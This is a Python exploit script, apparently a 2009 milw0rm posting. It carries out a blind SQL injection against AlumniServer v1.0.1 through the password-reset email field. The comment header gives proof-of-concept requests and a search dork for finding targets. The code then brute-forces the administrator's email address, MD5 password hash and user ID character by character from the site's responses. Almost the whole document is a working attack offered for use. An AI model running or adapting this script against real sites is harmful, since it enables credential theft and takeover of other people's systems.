#!/usr/bin/python
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\
#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/
#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []
#**							                                      **
#**    											      **
#**                           VIVA SPAIN!... GANAREMOS EL MUNDIAL!...o.O                      **
#**					   PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#---------------------------------------------------------------------------------------------
#|       	       (POST var 'resetpwemail') BLIND SQL INJECTION EXPLOIT      	     |
#|-------------------------------------------------------------------------------------------|
#|                                    |    AlumniServer v-1.0.1      |		    	     |
#|  CMS INFORMATION:          	       ------------------------------	               	     |
#|										             |
#|-->WEB: http://www.alumniserver.net/			          	                     |
#|-->DOWNLOAD: http://www.alumniserver.net/		         	                     |
#|-->DEMO: N/A   	     			    					     |
#|-->CATEGORY: CMS/Education								     |
#|-->DESCRIPTION: Open Source Alumni software, based on PHP+MySQL for universities, schools  |
#|		and companies. Services for usersinclude profile page,...	     	     |
#|-->RELEASED: 2009-06-11								     |
#|											     |
#|  CMS VULNERABILITY:									     |
#|											     |
#|-->TESTED ON: Python 2.6								     |
#|-->DORK: "AlumniServer project"					                     |
#|-->CATEGORY: BSQLi PYTHON EXPLOIT		                             		     |
#|-->AFFECT VERSION: CURRENT				 			             |
#|-->Discovered Bug date: 2009-06-15							     |
#|-->Reported Bug date: 2009-06-15							     |
#|-->Fixed bug date: N/A							             |
#|-->Info patch (????): N/A					  			     |
#|-->Author: YEnH4ckEr									     |
#|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
#|-->WEB/BLOG: N/A									     |
#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.      |
#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		     |
#---------------------------------------------------------------------------------------------
#
#------------
#CONDITIONS:
#------------
#
#magic quotes=OFF
#
#-------
#NEED:
#-------
#
#Valid email
#
#---------------------------------------
#PROOF OF CONCEPT (SQL INJECTION):
#---------------------------------------
#
#POST http://[HOST]/[PATH]/Password.php HTTP/1.1
#Host: [HOST]
#Referer: http://[HOST]/[PATH]/Password.php
#Content-Type: application/x-www-form-urlencoded
#
#resetpwemail=[valid_mail]%27+and+1%3D%270 --> FALSE
#resetpwemail=[valid_mail]%27+and+1%3D%271 --> TRUE
#
#Other P0C (with a registered user):
#
#http://[HOST]/[PATH]/Profile.php?id=[valid_id]%27+AND+1=0%23 -->FALSE
#http://[HOST]/[PATH]/Profile.php?id=[valid_id]%27+AND+1=1%23 -->TRUE
#
#--------------
#WATCH VIDEOS
#--------------
#
# BSQLi --> http://www.youtube.com/watch?v=K3z7iyHttBw
#
# AUTH BYPASS --> http://www.youtube.com/watch?v=UjDm2p7qHj0
#
#
##############################################################################
##############################################################################
##**************************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
##**************************************************************************##
##--------------------------------------------------------------------------##
##**************************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
##**************************************************************************##
##############################################################################
##############################################################################
#
#Used modules
import urllib2,sys,re,os
#Defined functions
def init():
	if(sys.platform=='win32'):
		os.system("cls")
		os.system ("title AlumniServer v-1.0.1 Blind SQL Injection Exploit")
		os.system ("color 02")
	else:
		os.system("clear")

	print "\t#######################################################\n\n"
	print "\t#######################################################\n\n"
	print "\t##     AlumniServer v-1.0.1 Blind SQLi Exploit       ##\n\n"
	print "\t##       ++Conditions: magic_quotes=OFF              ##\n\n"
	print "\t##       ++Needed: Valid mail                        ##\n\n"
	print "\t##               Author: Y3nh4ck3r                   ##\n\n"
	print "\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n"
	print "\t##            Proud to be Spanish!                   ##\n\n"
	print "\t#######################################################\n\n"
	print "\t#######################################################\n\n"

def request(urltarget,postmsg):
	req=urllib2.Request(url=urltarget,data=postmsg)
	conn = urllib2.urlopen(req)
	outcode=conn.read()
	#print outcode #--> Active this line for debugger mode
	return outcode

def error():
	print "\t------------------------------------------------------------\n"
	print "\tWeb isn't vulnerable!\n\n"
	print "\t--->Maybe:\n\n"
	print "\t\t1.-Patched.\n"
	print "\t\t2.-Bad path or host.\n"
	print "\t\t3.-Bad mail.\n"
	print "\t\t4.-Magic quotes ON.\n"
	print "\t\tEXPLOIT FAILED!\n"
	print "\t------------------------------------------------------------\n"
	sys.exit()

def testedblindsql():
	print "\t-----------------------------------------------------------------\n"
	print "\tWEB MAYBE BE VULNERABLE!\n\n"
	print "\tTested Blind SQL Injection.\n"
	print "\tStarting exploit...\n"
	print "\t-----------------------------------------------------------------\n\n"

def helper(filename):
	print "\n\t[!!!] AlumniServer v-1.0.1 Blind SQL Injection Exploit\n"
	print "\t[!!!] USAGE MODE: [!!!]\n"
	print "\t[!!!] python "+filename+" [HOST] [PATH] [MAIL] [ID_ADMIN/HIDDEN/BRUTEFORCEID]\n"
	print "\t[!!!] [HOST]: Web.\n"
	print "\t[!!!] [PATH]: Home Path.\n"
	print "\t[!!!] [MAIL]: Mail for fish\n"
	print "\t[!!!] [ID_ADMIN/HIDDEN/BRUTEFORCEID]: Id_admin if we are registered users or 'hidden' value if admin is hidden.\n"
	print "\t[!!!]  Also can use 'bruteforceid' value for bruteforce admin id previously.\n"
	print "\t[!!!] Example: python "+filename+" www.example.com demo y3nh4ck3r@gmail.com cd54cd7df99a\n"
	print "\t[!!!] Example: python "+filename+" www.example.com demo y3nh4ck3r@gmail.com hidden\n"
	print "\t[!!!] Example: python "+filename+" www.example.com demo y3nh4ck3r@gmail.com bruteforceid\n"
	sys.exit()

def brute_length(urlrequest, idadmin, mail):
	#Username length
	flag=1
	i=0
	while(flag==1):
		i=i+1
		if(idadmin=="hidden"):
			blindsql="resetpwemail="+mail+"'+AND+(SELECT+length(email)+FROM+as_users+WHERE+hideuser='y')='"+str(i) #injected code
		else:
			blindsql="resetpwemail="+mail+"'+AND+(SELECT+length(email)+FROM+as_users+WHERE+id='"+idadmin+"')='"+str(i) #injected code
		output=request(urlrequest, blindsql)
		if(re.search("You will receive an email shortly with a link that enables you to reset your password.",output)):
			flag=2
		else:
			flag=1
		#This is the max length of email
		if (i>50):
			error()
		#Save column length
	length=i
	print "\t<<<<<--------------------------------------------------------->>>>>\n"
	print "\tLength catched!\n"
	print "\tLength E-mail --> "+str(length)+"\n"
	print "\tWait several minutes...\n"
	print "\t<<<<<--------------------------------------------------------->>>>>\n\n"
	return length
def exploiting (lengthvalue, urlrequest, column, idadmin, mail):
	#Bruteforcing values
	values=""
	k=1
	z=32
	while((k<=lengthvalue) and (z<=126)):
		#Choose method, hidden or with id
		if(idadmin=="hidden"):
			blindsql="resetpwemail="+mail+"'+AND+ascii(substring((SELECT+"+column+"+FROM+as_users+WHERE+hideuser='y'),"+str(k)+",1))='"+str(z) #injected code
		else:
			blindsql="resetpwemail="+mail+"'+AND+ascii(substring((SELECT+"+column+"+FROM+as_users+WHERE+id='"+idadmin+"'),"+str(k)+",1))='"+str(z) #injected code
		output=request(urlrequest, blindsql)
		if(re.search("You will receive an email shortly with a link that enables you to reset your password.",output)):
			values=values+chr(z)
			k=k+1
			z=32
#new char
		z=z+1
	return values

def exploiting_id (urlrequest, mail):
	#Bruteforcing values
	values=""
	#Possible values of id
	arrayids=[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']
	k=1
	#Max length of id = 12
	while(k<=12):
		for z in arrayids:
			blindsql="resetpwemail="+mail+"'+AND+substring((SELECT+id+FROM+as_users+HAVING+MIN(membersince)),"+str(k)+",1)='"+str(z) #injected code
			output=request(urlrequest, blindsql)
			if(re.search("You will receive an email shortly with a link that enables you to reset your password.",output)):
				values=values+str(z)
				k=k+1
				z='g'
	return values
#Main
init()
#Init variables
if(len(sys.argv) <= 4):
    helper(sys.argv[0])

host=sys.argv[1]
path=sys.argv[2]
mail=sys.argv[3]
#Define mode: ID, hidden or bruteforceid
if(sys.argv[4]=="hidden"):
	mode="hidden"
elif(sys.argv[4]=="bruteforceid"):
	mode="bruteforceid"
else:
	mode="usual"
	idadmin=sys.argv[4]

finalrequest="http://"+host+"/"+path+"/Password.php"
testblind1="resetpwemail="+mail+"%27+and+1%3D%271" #Return true
outcode1=request(finalrequest,testblind1)
testblind2="resetpwemail="+mail+"%27+and+1%3D%270" #Return false
outcode2=request(finalrequest,testblind2)
#Check BSQLi
if(outcode1==outcode2):
	error()
else:
	testedblindsql()
if(mode=="usual"):
	#Catching length of admin email
	lengthadmin=brute_length(finalrequest, idadmin, mail)
	mailadmin=exploiting(lengthadmin, finalrequest, "email", idadmin, mail)
	#Catching value of password (hashed md5)
	passwordhash=exploiting(32, finalrequest, "password", idadmin, mail)
elif(mode=="hidden"):
	#Catching length of admin email
	lengthadmin=brute_length(finalrequest, "hidden", mail)
	mailadmin=exploiting(lengthadmin, finalrequest, "email", "hidden", mail)
	#Catching value of password (hashed md5)
	passwordhash=exploiting(32, finalrequest, "password", "hidden", mail)
else:
	print "\t<<<<<--------------------------------------------------------->>>>>\n"
	print "\tBruteforcing id. Wait a few minutes...\n"
	print "\t<<<<<--------------------------------------------------------->>>>>\n\n"
	#Catching value of admin id
	idadmin=exploiting_id(finalrequest, mail)

print "\n\t\t*************************************************\n"
print "\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n"
print "\t\t*************************************************\n\n"
#Mode usual and hidden
if((mode=="usual") or (mode=="hidden")):
	print "\t\tAdmin-mail: "+mailadmin+"\n\n"
	print "\t\tPassword hash: "+passwordhash+"\n\n"
else:
#Mode bruteforceid
    print "\t\tAdmin-id: "+idadmin+"\n\n"
print "\n\t\t<<----------------------FINISH!-------------------->>\n\n"
print "\t\t<<---------------Thanks to: y3nh4ck3r-------------->>\n\n"
print "\t\t<<------------------------EOF---------------------->>\n\n"

# milw0rm.com [2009-06-25]